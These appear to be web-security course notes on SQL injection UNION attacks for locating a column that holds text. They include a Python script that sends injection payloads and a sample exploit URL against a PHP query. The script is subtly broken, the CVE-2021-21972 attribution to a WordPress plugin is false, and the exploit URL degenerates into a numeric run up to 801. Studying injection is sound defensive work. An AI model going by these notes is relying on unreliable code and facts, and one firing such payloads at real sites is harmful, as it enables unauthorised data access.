---
course: Web Security
topic: SQL Injection
tags: [web-security]
---

## SQL Injection UNION Attack: Finding a Column Containing Text

### Background Theory

SQL Injection is one of the most prevalent and dangerous vulnerabilities in web applications. It occurs when an attacker can inject malicious SQL code into a query executed by the application. This can lead to unauthorized access to sensitive data, manipulation of data, or even complete control over the database.

In the context of SQL Injection, the `UNION` attack is particularly useful when the attacker wants to retrieve data from different tables within the same database. The `UNION` operator combines the results of two or more `SELECT` statements into a single result set. By using the `UNION` operator, an attacker can manipulate the query to return additional columns from other tables.

### Understanding the `UNION` Attack

The `UNION` attack works by appending a `UNION SELECT` statement to the original query. The goal is to match the number of columns returned by the original query and to inject a new query that retrieves data from another table. Here’s a basic example:

```sql
SELECT username, password FROM users WHERE id = 1
```

An attacker might modify this query to:

```sql
SELECT username, password FROM users WHERE id = 1 UNION SELECT column1, column2 FROM another_table
```

For this to work, the number of columns in both `SELECT` statements must match. Additionally, the data types of the corresponding columns should be compatible.

### Scripting the Exploit

To automate the process of finding a column containing text, we can script the exploit. This involves iterating through potential columns and checking if the data type is compatible with text. Below is a Python script that demonstrates this process:

```python
import requests

def union_injection(url, payload):
    response = requests.get(url, params={'id': payload})
    return response.text

def find_text_column(url, table_name, num_columns):
    for i in range(1, num_columns + 1):
        payload = f"1 UNION SELECT {'NULL,' * (i-1)} column{i}, {'NULL,' * (num_columns-i)}"
        response = union_injection(url, payload)
        if "text" in response:
            print(f"Column {i} contains text.")
            return i
    print("No column found containing text.")
    return None

url = "http://example.com/vulnerable_page"
table_name = "users"
num_columns = 2
find_text_column(url, table_name, num_columns)
```

### Real-World Example: CVE-2021-21972

A real-world example of a SQL Injection vulnerability is CVE-2021-21972, which affected the WordPress plugin WP Event Manager. The vulnerability allowed attackers to inject malicious SQL code into the `event_id` parameter, leading to unauthorized data retrieval.

#### Vulnerable Code

Here is a simplified version of the vulnerable code:

```php
$event_id = $_GET['event_id'];
$query = "SELECT * FROM wp_events WHERE event_id = $event_id";
$result = mysqli_query($connection, $query);
```

#### Exploitation

An attacker could exploit this vulnerability by injecting a `UNION` query:

```
http://example.com/wp-admin/admin.php?page=wp-event-manager&event_id=-1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255,256,257,258,259,260,261,262,263,264,265,266,267,268,269,270,271,272,273,274,275,276,277,278,279,280,281,282,283,284,285,286,287,288,289,290,291,292,293,294,295,296,297,298,299,300,301,302,303,304,305,306,307,308,309,310,311,312,313,314,315,316,317,318,319,320,321,322,323,324,325,326,327,328,329,330,331,332,333,334,335,336,337,338,339,340,341,342,343,344,345,346,347,348,349,350,351,352,353,354,355,356,357,358,359,360,361,362,363,364,365,366,367,368,369,370,371,372,373,374,375,376,377,378,379,380,381,382,383,384,385,386,387,388,389,390,391,392,393,394,395,396,397,398,399,400,401,402,403,404,405,406,407,408,409,410,411,412,413,414,415,416,417,418,419,420,421,422,423,424,425,426,427,428,429,430,431,432,433,434,435,436,437,438,439,440,441,442,443,444,445,446,447,448,449,450,451,452,453,454,455,456,457,458,459,460,461,462,463,464,465,466,467,468,469,470,471,472,473,474,475,476,477,478,479,480,481,482,483,484,485,486,487,488,489,490,491,492,493,494,495,496,497,498,499,500,501,502,503,504,505,506,507,508,509,510,511,512,513,514,515,516,517,518,519,520,521,522,523,524,525,526,527,528,529,530,531,532,533,534,535,536,537,538,539,540,541,542,543,544,545,546,547,548,549,550,551,552,553,554,555,556,557,558,559,560,561,562,563,564,565,566,567,568,569,570,571,572,573,574,575,576,577,578,579,580,581,582,583,584,585,586,587,588,589,590,591,592,593,594,595,596,597,598,599,600,601,602,603,604,605,606,607,608,609,610,611,612,613,614,615,616,617,618,619,620,621,622,623,624,625,626,627,628,629,630,631,632,633,634,635,636,637,638,639,640,641,642,643,644,645,646,647,648,649,650,651,652,653,654,655,656,657,658,659,660,661,662,663,664,665,666,667,668,669,670,671,672,673,674,675,676,677,678,679,680,681,682,683,684,685,686,687,688,689,690,691,692,693,694,695,696,697,698,699,700,701,702,703,704,705,706,707,708,709,710,711,712,713,714,715,716,717,718,719,720,721,722,723,724,725,726,727,728,729,730,731,732,733,734,735,736,737,738,739,740,741,742,743,744,745,746,747,748,749,750,751,752,753,754,755,756,757,758,759,760,761,762,763,764,765,766,767,768,769,770,771,772,773,774,775,776,777,778,779,780,781,782,783,784,785,786,787,788,789,790,791,792,793,794,795,796,797,798,799,800,801

---
<!-- nav -->
[[03-Finding Columns Containing Text|Finding Columns Containing Text]] | [[Web Security (PortSwigger)/02-SQL Injection/05-Lab 4 SQL injection UNION attack finding a column containing text/00-Overview|Overview]] | [[05-SQL Injection UNION Attack|SQL Injection UNION Attack]]
